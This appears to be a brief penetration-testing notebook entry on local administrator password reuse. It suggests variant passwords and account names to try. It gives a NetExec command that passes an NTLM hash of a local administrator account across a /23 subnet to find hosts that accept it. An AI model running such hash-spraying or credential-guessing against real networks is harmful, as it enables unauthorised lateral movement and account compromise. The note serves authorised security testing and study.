# Local admin password reuse 

If the password is `$desktop%@admin123`, it is worth attempting "`$server%@admin123`" against servers. If we found non-standard local admin accounts such as `bsmith`, try using `ssmith` or `bsmith_adm`. 

#### Local admin password reuse attack 
```
sudo nxc smb --local-auth 172.16.7.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
#### [[Internal PassSpray attack]]
